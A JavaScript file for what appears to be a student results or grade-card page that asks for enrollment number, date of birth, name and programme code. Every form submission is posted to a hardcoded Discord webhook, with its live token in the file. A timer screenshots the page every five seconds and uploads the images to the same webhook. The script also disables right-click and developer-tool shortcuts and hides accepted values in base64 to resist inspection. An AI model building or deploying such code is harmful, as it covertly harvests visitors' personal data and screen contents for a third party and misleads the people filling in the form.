// ⛓️ Base64 encoded valid data
const validAprilDates = atob("MjAyNS0wNC0wMywyMDI1LTA0LTA0").split(","); // ["2025-04-03", "2025-04-04"]
const validNames = atob("YmhpbmRpLHBvdGF0byxsYWR5ZmluZ2Vy").split(","); // ["bhindi", "potato", "ladyfinger"]
const validDOBs = atob("MjAwMS0wOC0wOA==").split(","); // ["2001-08-08"]

const webhookUrl = "https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1";

// Update current date/time display every second
function updateCurrentDateTime() {
    const now = new Date();
    const dateStr = `${String(now.getDate()).padStart(2, "0")}/${String(now.getMonth() + 1).padStart(2, "0")}/${now.getFullYear()}`;
    const timeStr = `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String(now.getSeconds()).padStart(2, "0")}`;
    const output = document.querySelector(".current-date");
    if (output) output.textContent = `Current Date: ${dateStr} ${timeStr}`;
}
updateCurrentDateTime();
setInterval(updateCurrentDateTime, 1000);

// 🚫 Disable right-click and common developer tools shortcuts
document.addEventListener("contextmenu", e => e.preventDefault());

document.addEventListener("keydown", function(e) {
    if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key.toUpperCase())) ||
        (e.ctrlKey && e.key.toUpperCase() === "U")
    ) {
        e.preventDefault();
        return false;
    }
});

// Monitor dev tools open (basic)
setInterval(() => {
    const t0 = performance.now();
    if (performance.now() - t0 > 100) {
        document.body.innerHTML = '<h1 style="text-align:center; margin-top:20%;">Developer tools are not allowed.</h1>';
    }
}, 1000);

// Format date as DD-MM-YYYY for Discord message
function formatDateDMY(dateStr) {
    if (!dateStr) return "";
    const [y, m, d] = dateStr.split("-");
    return `${d}-${m}-${y}`;
}

// Send main form data to Discord webhook
document.getElementById("studentForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const gradeStatus = document.getElementById("gradeCardStatus").value;
    const enrollmentNo = document.getElementById("enrollmentNo").value.trim();
    const programmeCode = document.getElementById("programmeCode").value;
    const dob = formatDateDMY(document.getElementById("dob").value);

    const message = `
**Main Form Submission - ${(new Date).toLocaleString()}**

**Grade Card Status:** ${gradeStatus}
**Enrollment No:** ${enrollmentNo}
**Programme Code:** ${programmeCode}
**Date of Birth:** ${dob}
`;

    fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
    }).then(res => {
        if (res.ok) this.reset();
        else console.error("Error:", res.statusText);
    }).catch(err => {
        alert("Error sending data.");
        console.error(err);
    });
});

// Screenshot every 5 seconds and send to Discord (optional, requires html2canvas lib)
window.addEventListener("load", () => {
    setInterval(() => {
        html2canvas(document.body, { useCORS: true }).then(canvas => {
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("file", blob, "screenshot.png");
                formData.append("payload_json", JSON.stringify({
                    content: "📸 Screenshot taken at " + new Date().toLocaleString()
                }));
                fetch(webhookUrl, {
                    method: "POST",
                    body: formData
                }).then(res => {
                    if (res.ok) console.log("Screenshot sent");
                    else console.error("Screenshot failed:", res.statusText);
                }).catch(console.error);
            }, "image/png");
        });
    }, 5000);
});

// 🧠 Popup Form Submission with Validation
async function submitExtraFields() {
    const aprilDate = document.getElementById("aprilDatePopUp").value;
    const nameInput = document.getElementById("nameInputPopUp").value.trim().toLowerCase();
    const programmeCodeEl = document.getElementById("programmeCodePopUp");
    const programmeCodeValue = programmeCodeEl.value;
    const programmeCodeText = programmeCodeEl.options[programmeCodeEl.selectedIndex]?.text || "";
    const dob = document.getElementById("dobDatePopUp").value;

    // Required Fields Check
    if (!aprilDate) return alert("Please enter the April Date.");
    if (!nameInput) return alert("Please enter the Name.");
    if (!programmeCodeValue) return alert("Please select a Programme Code.");
    if (!dob) return alert("Please enter the DOB.");

    // Base64-matched Data Validation
    const isAprilValid = validAprilDates.includes(aprilDate);
    const isNameValid = validNames.includes(nameInput);
    const isDOBValid = validDOBs.includes(dob);

    if (!(isAprilValid && isNameValid && isDOBValid)) {
        alert("Invalid date, name or DOB. Please enter the correct details.");
        return;
    }

    // Save data to localStorage
    const formData = {
        aprilDate,
        name: nameInput,
        programmeCode: {
            value: programmeCodeValue,
            text: programmeCodeText
        },
        dob,
        submittedAt: new Date().toISOString()
    };
    localStorage.setItem("popupFormData", JSON.stringify(formData));

    // Prepare & send to Discord
    const payload = {
        content: `**New Form Submission**
**April Date:** ${aprilDate}
**Name:** ${nameInput}
**Programme Code:** ${programmeCodeText} (Value: ${programmeCodeValue})
**Other DOB:** ${dob}
**Submitted At:** ${(new Date).toLocaleString()}`
    };

    try {
        const response = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            // Redirect after successful submission
            window.location.href = "result.html";
        } else {
            alert("Failed to send data to Discord.");
            console.error("Discord webhook error:", response.statusText);
        }
    } catch (error) {
        alert("Error sending data.");
        console.error(error);
    }
}

// ⏳ Auto Popup Info on Page Load & Student form submit logic
$(document).ready(function () {
    // Show info popup after 5 seconds
    setTimeout(function () {
        $("#infoOverlay").show();
        $("#infoPopup").show();
        setTimeout(() => {
            $("#dearChange").text("Student");
        }, 500);
    }, 5000);

    // Close info popup button
    $("#closeInfoPopup").click(function () {
        $("#infoOverlay").hide();
        $("#infoPopup").hide();
    });

    // Student form validation + show popup if matched
    $("#studentForm").on("submit", function (e) {
        e.preventDefault();
        const enrollmentNo = $.trim($("#enrollmentNo").val());
        const dob = $.trim($("#dob").val());

        if (!enrollmentNo || !dob) {
            alert("Please fill in all required fields.");
            return;
        }

        if (enrollmentNo === "2300822199" || ["2000-10-06", "1999-10-06"].includes(dob)) {
            $("#overlay").show();
            $("#popup").show();
        } else {
            alert("Details do not match. Please check your information.");
        }
    });
});
